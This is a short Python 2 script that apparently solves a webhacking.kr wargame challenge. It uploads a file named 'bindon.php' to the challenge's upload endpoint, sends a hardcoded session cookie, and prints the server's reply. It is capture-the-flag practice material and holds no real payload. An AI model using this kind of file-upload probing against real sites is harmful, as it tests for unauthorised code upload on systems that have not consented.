#-*- coding: utf-8 -*-
import requests

challengeUrl = "http://webhacking.kr/challenge/web/web-21/index.php"

uploadFile = {
    "file": ("bindon.php", "bindon", 'bindon')
}
sessionCookie = {
    "PHPSESSID": "73ea5f35f558006f21f6185c171a2ed9"
}

httpConnection = None
try:
    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
    print httpRequest.text
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
